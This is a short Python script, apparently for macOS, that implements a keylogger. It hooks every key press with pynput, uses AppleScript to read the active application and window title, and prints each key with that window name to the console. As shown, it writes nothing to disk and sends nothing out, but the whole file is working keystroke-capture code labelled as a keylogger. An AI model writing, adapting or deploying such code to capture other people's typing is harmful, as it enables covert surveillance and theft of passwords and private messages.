import subprocess
from pynput import keyboard
from datetime import datetime as dt

class Keylogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press)

    def PencereIsmiAl(self):
        script = '''
        tell application "System Events"
            set frontApp to name of first application process whose frontmost is true
            set windowTitle to name of front window of (first application process whose frontmost is true)
            return frontApp & ": " & windowTitle
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
        return result.stdout.strip()

    print("""Key Pressed | Active Window
------------|--------------""")

    def on_press(self,key):
        now = dt.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_char = key.char
        except AttributeError:
            key_char = key.name

        akitfPencere = self.PencereIsmiAl()

        if key_char == "cmd":
            print(key_char, "        |", akitfPencere.capitalize())

        elif key_char == "enter":
            print(key_char, "      |", akitfPencere.capitalize())

        elif key_char == "space ":
            print(key_char, "      |", akitfPencere.capitalize())

        elif key_char == "backspace":
            print(key_char, "  |", akitfPencere.capitalize())

        elif key_char == "shift":
            print(key_char, "      |", akitfPencere.capitalize())

        elif key_char == "alt":
            print(key_char, "        |", akitfPencere.capitalize())
            
        elif key_char == "ctrl":
            print(key_char, "       |", akitfPencere.capitalize())

        elif key_char == "left":
            print(key_char, "       |", akitfPencere.capitalize())

        elif key_char == "right":
            print(key_char, "      |", akitfPencere.capitalize())

        elif key_char == "up":
            print(key_char, "         |", akitfPencere.capitalize())

        elif key_char == "down":
            print(key_char, "       |", akitfPencere.capitalize())

        elif key_char == "tab":
            print(key_char, "        |", akitfPencere.capitalize())

        elif key_char == "caps_lock":
            print(key_char, "   |", akitfPencere.capitalize())

        elif key_char == None:
            print(key_char, "       |", akitfPencere.capitalize())

        else:
            if key_char == "shift_r":
                key_char = "shift"
                print(key_char, "      |", akitfPencere.capitalize())

            elif key_char == "alt_r":
                key_char = "alt"
                print(key_char, "        |", akitfPencere.capitalize())

            elif key_char == "cmd_r":
                key_char = "cmd"
                print(key_char, "        |", akitfPencere.capitalize())

            elif key_char == "media_volume_up":
                key_char = "Volume Up"
                print(key_char, "  |", akitfPencere.capitalize())

            elif key_char == "media_volume_down":
                key_char = "Volume Down"
                print(key_char, "|", akitfPencere.capitalize())

            elif key_char == "media_volume_mute":
                key_char = "Volume Mute"
                print(key_char, "|", akitfPencere.capitalize())

            elif key_char == "media_play_pause":
                print(None, "       |", akitfPencere.capitalize())

            else:
                print(key_char,"          |", akitfPencere.capitalize())
    def start(self):
        with self.listener:
            self.listener.join()


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()